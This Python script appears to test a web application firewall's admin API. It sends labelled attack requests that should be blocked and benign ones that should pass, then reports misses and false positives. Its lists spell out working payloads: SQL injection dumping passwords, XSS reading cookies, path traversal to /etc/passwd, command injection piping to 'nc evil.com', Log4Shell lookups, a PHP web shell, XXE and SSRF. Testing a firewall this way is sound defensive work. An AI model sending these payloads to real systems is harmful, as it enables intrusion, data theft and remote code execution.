import json, urllib.request, urllib.error, urllib.parse, sys
import os
ADMIN = os.environ.get("SG_ADMIN_URL", "http://localhost:8081")   # admin/base port (-Dport)
PROXY = os.environ.get("SG_PROXY_URL", "http://localhost:8080")   # source route port
def _login():
    body = json.dumps({"username": os.environ.get("SG_ADMIN_USER", "admin"), "password": os.environ["SG_ADMIN_PASSWORD"]}).encode()
    return json.load(urllib.request.urlopen(urllib.request.Request(ADMIN + "/signin?scaleguard=true", data=body, method="POST")))["token"]
T = _login()
def api(path, body=None, method=None):
    req = urllib.request.Request(ADMIN + path + "?scaleguard=true", data=json.dumps(body).encode() if body is not None else None,
                                 headers={"Authorization": T}, method=method or ("POST" if body is not None else "GET"))
    try:
        return json.load(urllib.request.urlopen(req))
    except urllib.error.HTTPError as e:
        return {"_status": e.code, **json.load(e)}
POLICY = json.loads(os.environ["WAF_POLICY"]) if os.environ.get("WAF_POLICY") else None  # e.g. CRS anomaly scoring
def test(uri="/", headers=None, body=None):
    req = {"uri": uri, "headers": headers or {}, "body": body}
    if POLICY: req["policy"] = POLICY
    return api("/waf/test", req)
q = urllib.parse.quote
ATTACKS = [
 ("sqli union", "/products?id=1 UNION SELECT username,password FROM users"),
 ("sqli union encoded", "/products?id=1%20UNION%20ALL%20SELECT%20null--"),
 ("sqli union comment-obfuscated", "/p?id=1/**/UNION/**/SELECT/**/1,2"),
 ("sqli double-encoded", "/p?id=" + q(q("' OR '1'='1"))),
 ("sqli tautology", "/login?user=admin' OR '1'='1"),
 ("sqli tautology numeric", "/item?id=1\" or 1=1--"),
 ("sqli comment", "/login?user=admin'--"),
 ("sqli stacked", "/p?id=5; DROP TABLE users"),
 ("sqli sleep", "/p?id=1 AND SLEEP(5)"),
 ("sqli waitfor", "/p?id=1; WAITFOR DELAY '0:0:5'"),
 ("sqli info schema", "/p?q=select table_name from information_schema.tables"),
 ("xss script", "/search?q=<script>alert(1)</script>"),
 ("xss script encoded", "/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E"),
 ("xss img onerror", "/search?q=<img src=x onerror=alert(1)>"),
 ("xss svg onload", "/search?q=<svg/onload=alert(1)>"),
 ("xss html entities", "/search?q=" + q("&lt;script&gt;alert(1)&lt;/script&gt;")),
 ("xss javascript uri", "/redirect?url=javascript:alert(1)"),
 ("xss iframe", "/c?m=<iframe src=//evil.com>"),
 ("xss eval", "/c?m=eval(atob('YWxlcnQoMSk='))"),
 ("traversal", "/download?file=../../../etc/passwd"),
 ("traversal encoded", "/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
 ("traversal windows", "/download?file=..\\..\\windows\\win.ini"),
 ("proc self", "/view?f=/proc/self/environ"),
 (".env probe", "/.env"),
 (".git probe", "/.git/config"),
 ("wp-config probe", "/wp-config.php"),
 ("php wrapper", "/index.php?page=php://filter/convert.base64-encode/resource=index"),
 ("rce semicolon", "/ping?host=8.8.8.8; cat /etc/passwd"),
 ("rce subshell", "/ping?host=$(whoami)"),
 ("rce pipe", "/ping?host=x | nc evil.com 4444"),
 ("log4shell", "/?q=${jndi:ldap://evil.com/a}"),
 ("log4shell obfuscated", "/?q=${${::-j}${::-n}di:ldap://x}"),
 ("ssti", "/hello?name={{7*7}}"),
 ("php tag", "/c?m=<?php system($_GET['c']); ?>"),
 ("ssrf metadata", "/fetch?url=http://169.254.169.254/latest/meta-data/"),
]
HEADER_ATTACKS = [
 ("scanner sqlmap", {"User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"}),
 ("scanner nuclei", {"User-Agent": "Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))"}),
 ("log4shell in header", {"X-Api-Version": "${jndi:ldap://evil.com/x}"}),
 ("sqli in cookie", {"Cookie": "session=abc' UNION SELECT password FROM users--"}),
 ("xss in referer", {"Referer": "https://x.com/?q=<script>alert(1)</script>"}),
]
BODY_ATTACKS = [
 ("sqli in form body", "username=admin'--&password=x", "application/x-www-form-urlencoded"),
 ("sqli in json body", '{"id":"1 UNION SELECT card_number FROM cards"}', "application/json"),
 ("xss in json body", '{"comment":"<img src=x onerror=fetch(`//evil`)>"}', "application/json"),
 ("xxe", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "application/xml"),
]
BENIGN = [
 ("home", "/"), ("static asset", "/static/js/main.3ae5eec3.js"), ("api list", "/api/v1/orders?page=2&limit=50&sort=-created_at"),
 ("search apostrophe", "/search?q=o'reilly books"), ("search with or", "/search?q=cats or dogs"), ("search select", "/search?q=select a plan that fits"),
 ("search union", "/search?q=union station chicago"), ("drop us a line", "/contact?msg=Drop us a line; we reply fast"),
 ("search sleep", "/search?q=how much sleep do I need"), ("email param", "/u?email=jane.doe%2Btest@example.com"),
 ("redirect url", "/login?next=https%3A%2F%2Fapp.example.com%2Fdashboard%3Ftab%3D1"), ("math", "/calc?expr=(2+3)*4-1"),
 ("dates", "/report?from=2026-01-01&to=2026-03-31"), ("unicode", "/search?q=%E0%A4%A8%E0%A4%AE%E0%A4%B8%E0%A5%8D%E0%A4%A4%E0%A5%87"),
 ("html-ish word", "/search?q=how to use the script tag safely"), ("release download", "/downloads/scaleguard-1.2.0.tar.gz"),
 ("dump download", "/backups/schema.sql"), ("dotted path", "/docs/v1.2/intro"), ("filter syntax", "/api/items?filter=price>10&filter=price<100"),
 ("graphql query", "/graphql?query={user(id:5){name,email}}"), ("hash route", "/app/#/settings/profile"),
 ("currency", "/pay?amount=1,299.00&currency=INR"), ("id list", "/api/users?ids=1,2,3;4"),
]
BENIGN_HEADERS = [
 {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-IN,en;q=0.9,hi;q=0.8",
  "Cookie": "session=eyJhbGciOi.abc; id=5; theme=dark; _ga=GA1.2.123.456", "Referer": "https://www.google.com/search?q=scaleguard+load+balancer"},
 {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"},
 {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0", "If-None-Match": "W/\"5e-abc\"", "Cache-Control": "no-cache"},
 {"User-Agent": "curl/8.5.0"}, {"User-Agent": "okhttp/4.12.0"}, {"User-Agent": "python-requests/2.32.3"},
 {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
 {"Content-Type": "application/json; charset=utf-8", "X-Request-ID": "3f2a-11ef-9c4b", "Authorization": "Bearer abc' OR '1'='1"},
]
BENIGN_BODIES = [
 ('{"name":"Jane O\'Brien","note":"Please select the blue one or the red one","qty":2}', "application/json"),
 ('{"query":"query { user(id: 5) { name orders(first: 10) { id total } } }"}', "application/json"),
 ("name=John+Smith&message=I+can%27t+log+in%2C+please+help+%3A%29&age=34", "application/x-www-form-urlencoded"),
 ("# Release notes\n\n- Fixed login bug\n- Updated docs: see https://docs.example.com/a?b=1&c=2\n", "text/markdown"),
 ('<order><id>42</id><item sku="A-1">Desk</item></order>', "application/xml"),
 ('{"sql_tip":"Use an index on user_id","code":"for i in range(10): print(i)"}', "application/json"),
]
fail = 0; n = 0
def check(label, r, expect_block):
    global fail, n; n += 1
    ok = r.get("blocked") == expect_block
    if not ok:
        fail += 1
        print(("MISSED " if expect_block else "FALSE POSITIVE ") + label, r.get("matches"))
for label, uri in ATTACKS: check(label, test(uri), True)
for label, h in HEADER_ATTACKS: check(label, test("/", h), True)
for label, b, ct in BODY_ATTACKS: check(label, test("/api", {"Content-Type": ct}, b), True)
attacks_n = n; attacks_fail = fail
for label, uri in BENIGN: check(label, test(uri, BENIGN_HEADERS[0]), False)
for i, h in enumerate(BENIGN_HEADERS): check("benign headers %d" % i, test("/", h), False)
for b, ct in BENIGN_BODIES: check("benign body " + b[:30], test("/api", {"Content-Type": ct}, b), False)
print("attacks blocked: %d/%d" % (attacks_n - attacks_fail, attacks_n))
print("benign passed:   %d/%d" % ((n - attacks_n) - (fail - attacks_fail), n - attacks_n))
